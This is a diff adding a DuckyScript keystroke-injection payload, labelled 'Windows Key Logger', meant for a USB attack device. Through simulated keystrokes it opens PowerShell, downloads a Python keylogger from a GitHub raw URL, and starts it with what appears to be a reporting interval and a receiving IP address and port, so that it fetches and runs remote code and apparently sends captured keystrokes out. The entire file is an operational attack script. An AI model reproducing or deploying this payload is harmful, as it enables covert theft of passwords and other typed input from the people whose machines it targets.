@@ -1,0 +1,27 @@
+REM     -- Windows Key Logger --
+REM
+REM (1) Opens Windows PowerShell.
+REM (2) Downloads the Windows Key Logger executable from GitHub.
+REM (3) Runs the Windows Key Logger as a separate process.
+REM (4) Closes Windows PowerShell.
+REM
+
+DELAY 1000
+
+GUI r
+DELAY 500
+
+STRING powershell
+ENTER
+DELAY 500
+
+STRING Invoke-WebRequest https://raw.githubusercontent.com/berjc/ysip-ms/master/payloads/win-key-logger.py -OutFile win-key-logger.py
+ENTER
+DELAY 1000
+
+STRING Start-Process python win-key-logger.py 15 192.168.33.145 5000
+ENTER
+DELAY 500
+
+STRING exit
+ENTER
